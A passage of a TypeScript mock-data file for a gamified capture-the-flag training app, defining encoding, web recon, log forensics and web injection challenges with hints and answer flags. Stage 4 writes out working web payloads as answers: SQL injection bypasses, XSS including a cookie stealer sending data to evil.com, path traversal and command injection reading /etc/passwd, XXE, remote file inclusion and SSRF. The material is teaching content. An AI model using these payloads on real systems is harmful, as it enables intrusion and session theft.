import { CtfStage } from '../types';

export const mockCtfStages: CtfStage[] = [
  // --- STAGE 1: BEGINNER - CRYPTOGRAPHY & ENCODING BASICS ---
  {
    id: 1,
    title: 'Stage 1: Cryptography & Encoding Basics',
    subtitle: 'Decode fundamental Base64, Hex, and Caesar ciphers to retrieve hidden agent flags.',
    difficulty: 'Beginner',
    durationSeconds: 600, // 10 minutes
    tasks: [
      {
        id: 's1-t1',
        stageId: 1,
        title: 'Base64 Agent ID',
        category: 'Cryptography',
        difficulty: 'Beginner',
        points: 50,
        description: 'Intercepted transmission contains a standard Base64 encoded string representing our operative codename.',
        prompt: 'Encoded Payload: Q1N7YmFzZTY0X2RlY29kZWRfc3VjY2Vzc30=',
        hint: 'Use a base64 decoder or atob() in javascript to decode the payload string.',
        characterPersona: {
          name: 'Cipher Scout Leo',
          role: 'Encoding Specialist',
          avatarPosition: '0% 0%',
          dialogue: 'Hey recruit! Base64 is just 6-bit binary represented in printable ASCII. Try decoding this string.'
        },
        correctFlag: 'CS{base64_decoded_success}',
        explanation: 'Base64 uses A-Z, a-z, 0-9, +, / characters to encode binary data into text.'
      },
      {
        id: 's1-t2',
        stageId: 1,
        title: 'Hexadecimal Coordinates',
        category: 'Cryptography',
        difficulty: 'Beginner',
        points: 50,
        description: 'A rogue drone broadcasted navigation waypoints in raw Hexadecimal format.',
        prompt: 'Hex Payload: 43537b6865785f636f6f7264696e617465735f666f756e647d',
        hint: 'Convert each pair of hex characters into ASCII text characters (e.g., 43 -> C).',
        characterPersona: {
          name: 'Hex Hacker Maya',
          role: 'Hex Analyst',
          avatarPosition: '20% 0%',
          dialogue: 'Hex digits range from 0-9 and a-f. Two hex digits represent one full byte of text!'
        },
        correctFlag: 'CS{hex_coordinates_found}',
        explanation: 'Hexadecimal notation represents bytes in base-16 format.'
      },
      {
        id: 's1-t3',
        stageId: 1,
        title: 'Caesar Cipher Shift 3',
        category: 'Cryptography',
        difficulty: 'Beginner',
        points: 60,
        description: 'An ancient Caesar cipher message was intercepted from an unencrypted terminal.',
        prompt: 'Ciphertext: FV{fdfv_lgbh_vwdu_vxpp|v}',
        hint: 'Shift every letter backward in the alphabet by 3 positions (ROT3).',
        characterPersona: {
          name: 'General Caesar',
          role: 'Classical Crypto Master',
          avatarPosition: '40% 0%',
          dialogue: 'Ah, the classic Roman shift! Move each letter 3 steps back to reveal the hidden truth.'
        },
        correctFlag: 'CS{caesar_shift_success}',
        explanation: 'Caesar cipher substitutes letters by shifting a fixed number of positions down the alphabet.'
      },
      {
        id: 's1-t4',
        stageId: 1,
        title: 'Binary Net Packet',
        category: 'Cryptography',
        difficulty: 'Beginner',
        points: 60,
        description: 'Raw binary stream captured from local loopback interface.',
        prompt: 'Binary: 01000011 01010011 01111011 01100010 01101001 01101110 01100001 01110010 01111001 01011111 01110011 01110100 01110010 01100101 01100001 01101101 01111101',
        hint: 'Group 8 bits at a time and convert each byte to its ASCII character equivalent.',
        characterPersona: {
          name: 'Bitwise Betty',
          role: 'Binary Operative',
          avatarPosition: '60% 0%',
          dialogue: 'Computers only speak 0 and 1. Translate these octets into ASCII text!'
        },
        correctFlag: 'CS{binary_stream}',
        explanation: '8 bits form 1 byte, which maps directly to ASCII characters.'
      },
      {
        id: 's1-t5',
        stageId: 1,
        title: 'Morse Code Distress',
        category: 'Cryptography',
        difficulty: 'Beginner',
        points: 70,
        description: 'Audio pulse translated into Morse code dots and dashes.',
        prompt: 'Morse: -.-. ... / -.-. --- -.. .',
        hint: '-.-. is C, ... is S, --- is O, -.. is D, . is E.',
        characterPersona: {
          name: 'Signal Sam',
          role: 'Radio Dispatcher',
          avatarPosition: '80% 0%',
          dialogue: 'Dots and dashes echo through the static. Decode them to spell out the flag!'
        },
        correctFlag: 'CS{CODE}',
        explanation: 'Morse code encodes alphabet letters into standardized sequences of short and long signals.'
      },
      {
        id: 's1-t6',
        stageId: 1,
        title: 'Reverse String Operative',
        category: 'Cryptography',
        difficulty: 'Beginner',
        points: 50,
        description: 'A message was transmitted backward to evade automated keyword filters.',
        prompt: 'Reversed String: }edoc_desrever_retsam_SC{',
        hint: 'Simply read the text string from right to left.',
        characterPersona: {
          name: 'Mirror Mira',
          role: 'Inversion Expert',
          avatarPosition: '100% 0%',
          dialogue: 'Look through the looking glass! Reverse the characters to restore the flag.'
        },
        correctFlag: 'CS{master_reversed_code}',
        explanation: 'String reversal is a simple obfuscation technique easily undone by flipping character order.'
      },
      {
        id: 's1-t7',
        stageId: 1,
        title: 'ROT13 Obfuscation',
        category: 'Cryptography',
        difficulty: 'Beginner',
        points: 60,
        description: 'A common usenet-style ROT13 ciphertext was found in a log file.',
        prompt: 'ROT13 Ciphertext: PF{ebg13_genafzvffpbaf}',
        hint: 'Shift each letter by exactly 13 places in the alphabet.',
        characterPersona: {
          name: 'Rotational Ray',
          role: 'ROT13 Specialist',
          avatarPosition: '10% 20%',
          dialogue: 'ROT13 is symmetric! Applying it twice gets you back to the original text.'
        },
        correctFlag: 'CS{rot13_transmissions}',
        explanation: 'ROT13 replaces a letter with the 13th letter after it in the alphabet.'
      },
      {
        id: 's1-t8',
        stageId: 1,
        title: 'ASCII Decimals',
        category: 'Cryptography',
        difficulty: 'Beginner',
        points: 60,
        description: 'Decimal ASCII character codes intercepted from printer buffer.',
        prompt: 'Decimals: 67 83 123 97 115 99 105 105 95 100 101 99 105 109 97 108 115 125',
        hint: 'Convert each decimal number to its corresponding ASCII character (e.g. 67 = C).',
        characterPersona: {
          name: 'Decimal Dan',
          role: 'Number Cruncher',
          avatarPosition: '30% 20%',
          dialogue: 'Every keyboard key has a standard decimal ASCII code value.'
        },
        correctFlag: 'CS{ascii_decimals}',
        explanation: 'ASCII standard maps integers 0-127 to characters and symbols.'
      },
      {
        id: 's1-t9',
        stageId: 1,
        title: 'URL Percent Encoding',
        category: 'Cryptography',
        difficulty: 'Beginner',
        points: 50,
        description: 'URI encoded string captured from web browser query parameters.',
        prompt: 'Encoded URL: %43%53%7b%75%72%6c%5f%65%6e%63%6f%64%65%64%7d',
        hint: 'Decode %43 to C, %53 to S, etc., or use decodeURIComponent().',
        characterPersona: {
          name: 'Web Walker Wendy',
          role: 'URI Specialist',
          avatarPosition: '50% 20%',
          dialogue: 'Special characters in URLs are escaped with percentage signs and hex values.'
        },
        correctFlag: 'CS{url_encoded}',
        explanation: 'URL encoding replaces unsafe ASCII characters with a % followed by two hexadecimal digits.'
      },
      {
        id: 's1-t10',
        stageId: 1,
        title: 'Keyboard QWERTY Shift',
        category: 'Cryptography',
        difficulty: 'Beginner',
        points: 70,
        description: 'Typing error cipher: every letter was shifted one key to the left on a QWERTY keyboard.',
        prompt: 'Shifted Cipher: DT{kwersyj_gsjeu}',
        hint: 'Look at a QWERTY keyboard and shift each typed letter one key to the right.',
        characterPersona: {
          name: 'Typing Ty',
          role: 'Keyboard Sleuth',
          avatarPosition: '70% 20%',
          dialogue: 'My fingers slipped on the keys! Shift each letter right on your keyboard.'
        },
        correctFlag: 'CS{qwerty_shift}',
        explanation: 'Spatial substitution ciphers rely on physical keyboard layouts rather than alphabet order.'
      }
    ]
  },

  // --- STAGE 2: BEGINNER - WEB RECONNAISSANCE & HEADERS ---
  {
    id: 2,
    title: 'Stage 2: Web Reconnaissance & Headers',
    subtitle: 'Inspect HTTP response headers, robots.txt, and cookies to find hidden flags.',
    difficulty: 'Beginner',
    durationSeconds: 600,
    tasks: [
      {
        id: 's2-t1',
        stageId: 2,
        title: 'X-Powered-By Header',
        category: 'Web Security',
        difficulty: 'Beginner',
        points: 50,
        description: 'Inspect the server response headers of the target staging application.',
        prompt: 'HTTP Response:\nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nX-Powered-By: CS{server_headers_exposed}\nContent-Type: text/html',
        hint: 'Look closely at the custom HTTP response header fields.',
        characterPersona: {
          name: 'Header Harry',
          role: 'Web Inspector',
          avatarPosition: '90% 20%',
          dialogue: 'Servers often leak metadata in HTTP headers. Always check your curl -I output!'
        },
        correctFlag: 'CS{server_headers_exposed}',
        explanation: 'HTTP headers convey metadata between client and server, sometimes leaking sensitive version or flag info.'
      },
      {
        id: 's2-t2',
        stageId: 2,
        title: 'Robots.txt Disallow',
        category: 'Web Security',
        difficulty: 'Beginner',
        points: 50,
        description: 'Check the search engine crawler exclusion file on the target server.',
        prompt: 'Content of /robots.txt:\nUser-agent: *\nDisallow: /admin/\nDisallow: /secret-flag-CS{robots_txt_found}.txt',
        hint: 'Web scrapers and attackers read robots.txt to discover hidden directories and files.',
        characterPersona: {
          name: 'Crawler Carl',
          role: 'OSINT Gatherer',
          avatarPosition: '0% 40%',
          dialogue: 'Robots.txt is meant to guide search engines, but it often acts as a treasure map for hackers!'
        },
        correctFlag: 'CS{robots_txt_found}',
        explanation: 'robots.txt is publicly accessible and should never store secret filenames or confidential paths.'
      },
      {
        id: 's2-t3',
        stageId: 2,
        title: 'HTML Comment Clue',
        category: 'Web Security',
        difficulty: 'Beginner',
        points: 50,
        description: 'View the HTML source code of the homepage to find developer notes left behind.',
        prompt: 'HTML Source:\n<!-- TODO: Remove debug flag before production deployment: CS{html_comments_leak} -->\n<html>...</html>',
        hint: 'Right-click and select View Page Source, then search for comment tags <!-- -->.',
        characterPersona: {
          name: 'Source Stella',
          role: 'DOM Detective',
          avatarPosition: '20% 40%',
          dialogue: 'Developers love leaving notes in HTML comments. Inspect the DOM source code!'
        },
        correctFlag: 'CS{html_comments_leak}',
        explanation: 'HTML comments are visible to anyone viewing page source in their browser.'
      },
      {
        id: 's2-t4',
        stageId: 2,
        title: 'Cookie Monster Value',
        category: 'Web Security',
        difficulty: 'Beginner',
        points: 60,
        description: 'Examine browser cookies set upon logging into the guest portal.',
        prompt: 'Document.cookie:\nsession_id=9f8c7b6a;\nuser_role=guest;\nflag_cookie=CS{cookies_are_transparent}',
        hint: 'Open browser developer console and type document.cookie or check Application > Cookies.',
        characterPersona: {
          name: 'Cookie Chloe',
          role: 'Session Analyst',
          avatarPosition: '40% 40%',
          dialogue: 'Client-side cookies can be viewed and modified easily unless marked HttpOnly.'
        },
        correctFlag: 'CS{cookies_are_transparent}',
        explanation: 'Cookies store state in the browser but should never hold sensitive flags or unencrypted secrets.'
      },
      {
        id: 's2-t5',
        stageId: 2,
        title: 'Security.txt Contact',
        category: 'Web Security',
        difficulty: 'Beginner',
        points: 60,
        description: 'RFC 9116 standard vulnerability disclosure file inspection.',
        prompt: 'Content of /.well-known/security.txt:\nContact: security@enterprise.org\nEncryption: https://enterprise.org/pgp-key.txt\nPolicy: CS{security_txt_compliant}',
        hint: 'Check the well-known path used for security researchers.',
        characterPersona: {
          name: 'Policy Pete',
          role: 'Compliance Officer',
          avatarPosition: '60% 40%',
          dialogue: 'Security.txt helps ethical hackers report vulnerabilities safely and directly.'
        },
        correctFlag: 'CS{security_txt_compliant}',
        explanation: 'security.txt provides a standardized way for security researchers to report vulnerabilities.'
      },
      {
        id: 's2-t6',
        stageId: 2,
        title: 'Favicon Hash Fingerprint',
        category: 'Web Security',
        difficulty: 'Beginner',
        points: 70,
        description: 'Analyzing web application icon hash to identify framework technology.',
        prompt: 'MurmurHash3 computed for /favicon.ico matches framework signature: CS{favicon_fingerprint}',
        hint: 'Favicon hashes are often used in Shodan queries to locate specific web applications.',
        characterPersona: {
          name: 'Icon Ian',
          role: 'Asset Profiler',
          avatarPosition: '80% 40%',
          dialogue: 'Even a tiny website favicon can fingerprint the exact backend framework in use!'
        },
        correctFlag: 'CS{favicon_fingerprint}',
        explanation: 'Favicon hashing allows defenders and attackers to discover deployed web applications across the internet.'
      },
      {
        id: 's2-t7',
        stageId: 2,
        title: 'HTTP Allow Methods',
        category: 'Web Security',
        difficulty: 'Beginner',
        points: 60,
        description: 'OPTIONS request sent to web server endpoint.',
        prompt: 'HTTP/1.1 204 No Content\nAllow: GET, POST, PUT, DELETE, OPTIONS, TRACE\nFlag-Header: CS{http_methods_allowed}',
        hint: 'Check the OPTIONS verb response for allowed methods and custom headers.',
        characterPersona: {
          name: 'Verbose Vicky',
          role: 'HTTP Method Tester',
          avatarPosition: '100% 40%',
          dialogue: 'OPTIONS tells you what HTTP verbs the server accepts. Look for dangerous TRACE or PUT methods!'
        },
        correctFlag: 'CS{http_methods_allowed}',
        explanation: 'HTTP verbs define the action to be performed on a given resource.'
      },
      {
        id: 's2-t8',
        stageId: 2,
        title: 'Sitemap XML Index',
        category: 'Web Security',
        difficulty: 'Beginner',
        points: 50,
        description: 'Reviewing sitemap.xml for unlinked staging endpoints.',
        prompt: '<url>\n  <loc>https://enterprise.org/staging-portal-CS{sitemap_xml_hidden}</loc>\n  <lastmod>2026-11-20</lastmod>\n</url>',
        hint: 'Sitemaps list all indexed web pages, sometimes including forgotten staging URLs.',
        characterPersona: {
          name: 'Mapmaker Max',
          role: 'Recon Specialist',
          avatarPosition: '10% 60%',
          dialogue: 'Sitemaps are designed for search engines, but they reveal hidden site architecture to analysts.'
        },
        correctFlag: 'CS{sitemap_xml_hidden}',
        explanation: 'Sitemaps list URLs available for crawling, which can expose private or test endpoints.'
      },
      {
        id: 's2-t9',
        stageId: 2,
        title: 'Server Header Disclosure',
        category: 'Web Security',
        difficulty: 'Beginner',
        points: 50,
        description: 'Apache server banner leakage analysis.',
        prompt: 'Server: Apache/2.4.41 (Ubuntu) OpenSSL/1.1.1f PHP/7.4.3\nX-Flag: CS{apache_banner_leak}',
        hint: 'Examine server version disclosure headers for embedded flag data.',
        characterPersona: {
          name: 'Banner Ben',
          role: 'Server Auditor',
          avatarPosition: '30% 60%',
          dialogue: 'Banner grabbing reveals software versions. Always disable server signature disclosure!'
        },
        correctFlag: 'CS{apache_banner_leak}',
        explanation: 'Detailed server banners help attackers identify known software vulnerabilities.'
      },
      {
        id: 's2-t10',
        stageId: 2,
        title: 'CORS Wildcard Header',
        category: 'Web Security',
        difficulty: 'Beginner',
        points: 70,
        description: 'Cross-Origin Resource Sharing policy evaluation.',
        prompt: 'Access-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\nNote: CS{cors_misconfigured}',
        hint: 'Wildcard CORS with credentials enabled creates significant security risks.',
        characterPersona: {
          name: 'Origin Olivia',
          role: 'CORS Specialist',
          avatarPosition: '50% 60%',
          dialogue: 'Misconfigured CORS policies can allow malicious third-party websites to read private user data.'
        },
        correctFlag: 'CS{cors_misconfigured}',
        explanation: 'CORS headers dictate how browsers permit resources to be requested from another domain.'
      }
    ]
  },

  // --- STAGE 3: BEGINNER - LOG FORENSICS & SIEM TRIAGE ---
  {
    id: 3,
    title: 'Stage 3: Log Forensics & SIEM Triage',
    subtitle: 'Analyze authentication logs, brute force attempts, and suspicious access patterns.',
    difficulty: 'Beginner',
    durationSeconds: 600,
    tasks: [
      {
        id: 's3-t1',
        stageId: 3,
        title: 'Failed SSH Logins',
        category: 'Log Forensics',
        difficulty: 'Beginner',
        points: 50,
        description: 'Reviewing auth.log for brute-force signatures against SSH daemon.',
        prompt: 'Nov 20 04:12:33 ip-10 sshd[8412]: Failed password for root from 192.168.1.105 port 54321 ssh2\nFlag: CS{ssh_brute_force_detected}',
        hint: 'Examine authentication logs for repeated failed root login entries.',
        characterPersona: {
          name: 'Logman Larry',
          role: 'SIEM Analyst',
          avatarPosition: '70% 60%',
          dialogue: 'Auth logs tell the story of every login attempt. Keep your eyes peeled for brute force!'
        },
        correctFlag: 'CS{ssh_brute_force_detected}',
        explanation: 'Authentication logs record successful and failed login attempts across system services.'
      },
      {
        id: 's3-t2',
        stageId: 3,
        title: 'Sudo Privilege Escalation',
        category: 'Log Forensics',
        difficulty: 'Beginner',
        points: 60,
        description: 'Checking sudo command execution logs for unauthorized administrative actions.',
        prompt: 'Nov 20 05:01:12 server sudo:   www-data : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash\nFlag: CS{sudo_privilege_escalation}',
        hint: 'Look at user context switching logs in syslog/auth.log.',
        characterPersona: {
          name: 'Privilege Paul',
          role: 'Access Control Auditor',
          avatarPosition: '90% 60%',
          dialogue: 'Web service accounts should never have unrestricted sudo access to bash!'
        },
        correctFlag: 'CS{sudo_privilege_escalation}',
        explanation: 'Sudo logs record every command executed with elevated administrative privileges.'
      },
      {
        id: 's3-t3',
        stageId: 3,
        title: 'Web Server Access Log',
        category: 'Log Forensics',
        difficulty: 'Beginner',
        points: 50,
        description: 'Analyze Apache/Nginx access log for suspicious directory fuzzing.',
        prompt: '192.168.1.50 - - [20/Nov/2026:06:12:00 +0000] "GET /admin-backup-CS{access_log_fuzzing}.zip HTTP/1.1" 200 4520',
        hint: 'Examine HTTP status 200 responses in access logs for sensitive file requests.',
        characterPersona: {
          name: 'Access Andy',
          role: 'Web Log Hunter',
          avatarPosition: '0% 80%',
          dialogue: 'Access logs record every HTTP request. Status 200 means the file was successfully downloaded!'
        },
        correctFlag: 'CS{access_log_fuzzing}',
        explanation: 'Web access logs capture IP addresses, timestamps, requested URIs, and HTTP response codes.'
      },
      {
        id: 's3-t4',
        stageId: 3,
        title: 'Cron Job Persistence',
        category: 'Log Forensics',
        difficulty: 'Beginner',
        points: 60,
        description: 'Investigating scheduled task modifications for persistence mechanisms.',
        prompt: 'Crontab entry found:\n*/5 * * * * root /tmp/malicious_beacon.sh # CS{cron_job_persistence}',
        hint: 'Cron schedules automated jobs on Unix systems. Look for suspicious script executions.',
        characterPersona: {
          name: 'Cronie Clara',
          role: 'Persistence Hunter',
          avatarPosition: '20% 80%',
          dialogue: 'Attackers love cron jobs to ensure their malware restarts automatically after reboot.'
        },
        correctFlag: 'CS{cron_job_persistence}',
        explanation: 'Cron jobs are frequently abused by threat actors to maintain persistence on compromised Linux servers.'
      },
      {
        id: 's3-t5',
        stageId: 3,
        title: 'Firewall Drop Log',
        category: 'Log Forensics',
        difficulty: 'Beginner',
        points: 50,
        description: 'Analyzing iptables/nftables packet drop telemetry.',
        prompt: 'UFW BLOCK IN=eth0 OUT= SRC=203.0.113.42 DST=192.168.1.10 PROTO=TCP SPT=44312 DPT=3389\nInfo: CS{firewall_block_rdp}',
        hint: 'Check blocked destination ports (e.g. 3389 for RDP).',
        characterPersona: {
          name: 'Firewall Fiona',
          role: 'Perimeter Guard',
          avatarPosition: '40% 80%',
          dialogue: 'Firewalls log unauthorized connection attempts trying to reach internal services.'
        },
        correctFlag: 'CS{firewall_block_rdp}',
        explanation: 'Firewall logs show dropped packets and blocked malicious scanning traffic.'
      },
      {
        id: 's3-t6',
        stageId: 3,
        title: 'DNS Query Log',
        category: 'Log Forensics',
        difficulty: 'Beginner',
        points: 60,
        description: 'Reviewing Pi-hole / BIND DNS query logs for malicious domain lookups.',
        prompt: 'Query: evil-command-and-control-domain-CS{dns_query_exfil}.com type A from 192.168.1.25',
        hint: 'DNS queries reveal outbound domain resolution attempts from internal hosts.',
        characterPersona: {
          name: 'DNS Dave',
          role: 'Network Resolver',
          avatarPosition: '60% 80%',
          dialogue: 'DNS is often used for data exfiltration and command & control beaconing.'
        },
        correctFlag: 'CS{dns_query_exfil}',
        explanation: 'DNS request logs help identify malware communicating with external C2 servers.'
      },
      {
        id: 's3-t7',
        stageId: 3,
        title: 'FTP Anonymous Login',
        category: 'Log Forensics',
        difficulty: 'Beginner',
        points: 50,
        description: 'Checkingvsftpd logs for anonymous file server access.',
        prompt: 'Mon Nov 20 08:14:22 2026 [pid 412] CONNECT: Client "192.168.1.88"\nFTP Login: user "anonymous" -> password "guest@"\nFlag: CS{ftp_anonymous_access}',
        hint: 'Anonymous FTP allows unauthenticated users to download public files.',
        characterPersona: {
          name: 'FTP Frank',
          role: 'File Transfer Specialist',
          avatarPosition: '80% 80%',
          dialogue: 'Anonymous FTP should be disabled on production servers to prevent data leaks.'
        },
        correctFlag: 'CS{ftp_anonymous_access}',
        explanation: 'Anonymous FTP permits public access to file repositories without specific user accounts.'
      },
      {
        id: 's3-t8',
        stageId: 3,
        title: 'Windows Security Event 4625',
        category: 'Log Forensics',
        difficulty: 'Beginner',
        points: 60,
        description: 'Analyzing Windows Domain Controller Event ID 4625 (Failed Logon).',
        prompt: 'Event ID 4625: An account failed to log on.\nAccount Name: Administrator\nFailure Reason: Unknown user name or bad password\nData: CS{windows_event_4625}',
        hint: 'Event ID 4625 indicates failed Windows authentication attempts.',
        characterPersona: {
          name: 'Windows Wendy',
          role: 'Active Directory Auditor',
          avatarPosition: '100% 80%',
          dialogue: 'Windows Event Viewer logs everything from logons to object access.'
        },
        correctFlag: 'CS{windows_event_4625}',
        explanation: 'Event ID 4625 is crucial for detecting password spraying and brute force attacks in Windows domains.'
      },
      {
        id: 's3-t9',
        stageId: 3,
        title: 'Database Query Error Log',
        category: 'Log Forensics',
        difficulty: 'Beginner',
        points: 70,
        description: 'PostgreSQL error log inspection for SQL injection syntax errors.',
        prompt: 'ERROR: syntax error at or near "\'" at character 42\nSTATEMENT: SELECT * FROM users WHERE username = \'admin\'\' OR \'1\'=\'1\'; --\nFlag: CS{sql_injection_error}',
        hint: 'Database logs record syntax errors caused by malformed SQL injection payloads.',
        characterPersona: {
          name: 'DB Donna',
          role: 'Database Administrator',
          avatarPosition: '10% 10%',
          dialogue: 'Database error logs often expose SQL injection attempts when input isn\'t sanitized!'
        },
        correctFlag: 'CS{sql_injection_error}',
        explanation: 'Unsanitized input causes SQL syntax errors that appear directly in database logs.'
      },
      {
        id: 's3-t10',
        stageId: 3,
        title: 'Proxy Content Filter Log',
        category: 'Log Forensics',
        difficulty: 'Beginner',
        points: 60,
        description: 'Squid web proxy log entry for blocked malicious categorization.',
        prompt: '172.16.4.12 - - [20/Nov/2026:09:45:10] "GET http://phishing-bank-login.com/index.html" 403 412 TCP_DENIED:NONE/192.168.0.1 - CS{proxy_blocked_phishing}',
        hint: 'Proxy logs record web traffic routed through enterprise gateways.',
        characterPersona: {
          name: 'Proxy Pete',
          role: 'Gateway Monitor',
          avatarPosition: '30% 30%',
          dialogue: 'Enterprise web proxies inspect and block connections to known malicious domains.'
        },
        correctFlag: 'CS{proxy_blocked_phishing}',
        explanation: 'Web proxies enforce organizational access policies and log blocked malicious requests.'
      }
    ]
  },

  // --- STAGE 4: INTERMEDIATE - WEB VULNERABILITIES & INJECTION ---
  {
    id: 4,
    title: 'Stage 4: Web Vulnerabilities & Injection',
    subtitle: 'Exploit SQL injections, Cross-Site Scripting (XSS), and Local File Inclusion (LFI).',
    difficulty: 'Intermediate',
    durationSeconds: 900, // 15 minutes
    tasks: [
      {
        id: 's4-t1',
        stageId: 4,
        title: 'Classic SQL Injection Auth Bypass',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 100,
        description: 'Bypass the login authentication query using a boolean tautology payload.',
        prompt: 'Vulnerable Query: SELECT * FROM accounts WHERE user = \'{INPUT}\' AND pass = \'xyz\'\nInject payload to get flag:',
        hint: 'Use OR \'1\'=\'1\' with a SQL comment to ignore the password check.',
        characterPersona: {
          name: 'SQL Sam',
          role: 'Database Penetration Tester',
          avatarPosition: '50% 50%',
          dialogue: 'SQL injection occurs when user input is concatenated directly into database queries.'
        },
        correctFlag: "admin' OR '1'='1' --",
        explanation: 'Boolean tautologies force the WHERE clause to evaluate as TRUE, granting unauthorized access.'
      },
      {
        id: 's4-t2',
        stageId: 4,
        title: 'Reflected XSS Alert',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 90,
        description: 'Craft a reflected XSS payload that triggers JavaScript alert dialog.',
        prompt: 'Search parameter reflected without sanitization: /search?q={INPUT}\nProvide working script payload:',
        hint: 'Standard script tag containing alert() function.',
        characterPersona: {
          name: 'XSS Xavier',
          role: 'Client-Side Exploit Master',
          avatarPosition: '70% 70%',
          dialogue: 'Cross-Site Scripting allows execution of malicious scripts in victim browsers.'
        },
        correctFlag: '<script>alert(1)</script>',
        explanation: 'Reflected XSS executes immediately when a victim clicks a crafted malicious link.'
      },
      {
        id: 's4-t3',
        stageId: 4,
        title: 'Local File Inclusion (LFI)',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 100,
        description: 'Read the passwd file using directory traversal sequences.',
        prompt: 'Vulnerable endpoint: /index.php?page={INPUT}\nProvide traversal payload to read /etc/passwd:',
        hint: 'Use multiple parent directory traversals like ../../../etc/passwd',
        characterPersona: {
          name: 'Traversal Tina',
          role: 'File Inclusion Expert',
          avatarPosition: '90% 90%',
          dialogue: 'Directory traversal lets attackers read sensitive system files outside the web root.'
        },
        correctFlag: '../../../../etc/passwd',
        explanation: 'LFI vulnerabilities arise when file path parameters are not strictly validated against traversal.'
      },
      {
        id: 's4-t4',
        stageId: 4,
        title: 'UNION-based SQLi Column Count',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 110,
        description: 'Determine the number of columns in the target SQL table using UNION SELECT.',
        prompt: 'Endpoint: /items?category=1 {INPUT}\nProvide UNION payload testing 3 columns:',
        hint: 'UNION SELECT null, null, null',
        characterPersona: {
          name: 'Union Uma',
          role: 'SQL Injection Architect',
          avatarPosition: '10% 30%',
          dialogue: 'UNION operators require matching column counts between the original and injected queries.'
        },
        correctFlag: 'UNION SELECT null,null,null',
        explanation: 'UNION SQL injection combines results from multiple SELECT statements into a single result set.'
      },
      {
        id: 's4-t5',
        stageId: 4,
        title: 'Command Injection via Ping',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 100,
        description: 'Chain a command injection payload into a ping utility web interface.',
        prompt: 'Form input: ping {INPUT}\nInject command to execute cat /etc/passwd:',
        hint: 'Use command chaining separators like ; or &&',
        characterPersona: {
          name: 'Commander Cody',
          role: 'OS Command Expert',
          avatarPosition: '30% 50%',
          dialogue: 'Command injection allows execution of arbitrary OS shell commands through web forms.'
        },
        correctFlag: '; cat /etc/passwd',
        explanation: 'Unsanitized input passed directly to system shell execution functions enables remote code execution.'
      },
      {
        id: 's4-t6',
        stageId: 4,
        title: 'Stored XSS Cookie Stealer',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 100,
        description: 'Craft a stored XSS payload that steals document.cookie.',
        prompt: 'Comment box vulnerable to stored XSS. Inject script to exfiltrate cookies:',
        hint: '<script>fetch(\'http://attacker.com/?cookie=\'+document.cookie)</script>',
        characterPersona: {
          name: 'Cookie Stealer Sam',
          role: 'Payload Engineer',
          avatarPosition: '50% 10%',
          dialogue: 'Stored XSS persists in the database, infecting every visitor who views the comment page.'
        },
        correctFlag: '<script>fetch("http://evil.com/?c="+document.cookie)</script>',
        explanation: 'Stored XSS is highly dangerous because payloads persist on the server for all future viewers.'
      },
      {
        id: 's4-t7',
        stageId: 4,
        title: 'Remote Code Inclusion (RFI)',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 110,
        description: 'Include an external remote script URL via vulnerable include parameter.',
        prompt: 'Vulnerable parameter: /index.php?template={INPUT}\nProvide external URL payload:',
        hint: 'Include http://evil.com/shell.txt',
        characterPersona: {
          name: 'Remote Rex',
          role: 'RFI Specialist',
          avatarPosition: '70% 30%',
          dialogue: 'Remote File Inclusion requires allow_url_include to be enabled in PHP configuration.'
        },
        correctFlag: 'http://evil.com/shell.txt',
        explanation: 'RFI allows attackers to execute arbitrary code hosted on external attacker-controlled servers.'
      },
      {
        id: 's4-t8',
        stageId: 4,
        title: 'Blind SQLi Boolean Check',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 120,
        description: 'Craft a boolean-based blind SQL injection testing first character of database version.',
        prompt: 'Query condition: WHERE id = 1 AND {INPUT}\nCheck if first char ASCII > 60:',
        hint: 'ASCII(SUBSTRING(@@version,1,1))>60',
        characterPersona: {
          name: 'Blind Bob',
          role: 'Boolean Injection Master',
          avatarPosition: '90% 50%',
          dialogue: 'Blind SQLi extracts data byte-by-byte by observing true/false application responses.'
        },
        correctFlag: 'ASCII(SUBSTRING(@@version,1,1))>60',
        explanation: 'Boolean blind SQL injection extracts data when the application returns different responses for true/false conditions.'
      },
      {
        id: 's4-t9',
        stageId: 4,
        title: 'XML External Entity (XXE) Injection',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 110,
        description: 'Inject an external entity definition into an XML parser endpoint.',
        prompt: 'XML Payload structure:\n<?xml version="1.0"?>\n{INPUT}\n<foo>&xxe;</foo>',
        hint: 'Define <!ENTITY xxe SYSTEM "file:///etc/passwd">',
        characterPersona: {
          name: 'XML Xavier',
          role: 'Parser Exploiter',
          avatarPosition: '10% 70%',
          dialogue: 'XXE attacks exploit vulnerable XML parsers to read local files and perform SSRF.'
        },
        correctFlag: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        explanation: 'XXE occurs when XML parsers evaluate external entity references within untrusted XML documents.'
      },
      {
        id: 's4-t10',
        stageId: 4,
        title: 'Server-Side Request Forgery (SSRF)',
        category: 'Web Security',
        difficulty: 'Intermediate',
        points: 110,
        description: 'Force the server to fetch internal metadata service via URL parameter.',
        prompt: 'Image fetcher endpoint: /fetch?url={INPUT}\nTarget internal metadata IP:',
        hint: 'http://169.254.169.254/latest/meta-data/',
        characterPersona: {
          name: 'SSRF Sophia',
          role: 'Cloud Perimeter Tester',
          avatarPosition: '30% 90%',
          dialogue: 'SSRF tricks backend servers into making HTTP requests to internal or restricted resources.'
        },
        correctFlag: 'http://169.254.169.254/latest/meta-data/',
        explanation: 'SSRF vulnerabilities allow attackers to query internal network services hidden behind firewalls.'
      }
    ]
  },

  // --- STAGE 5: INTERMEDIATE - NETWORK & PACKET FORENSICS ---
  {
    id: 5,
    title: 'Stage 5: Network & Packet Forensics',
    subtitle: 'Analyze PCAP captures, Wireshark packet streams, TCP handshakes, and DNS exfiltration.',
    difficulty: 'Intermediate',
    durationSeconds: 900,
    tasks: [
      {
        id: 's5-t1',
        stageId: 5,
        title: 'TCP SYN Flood Signature',
        category: 'Network Analysis',
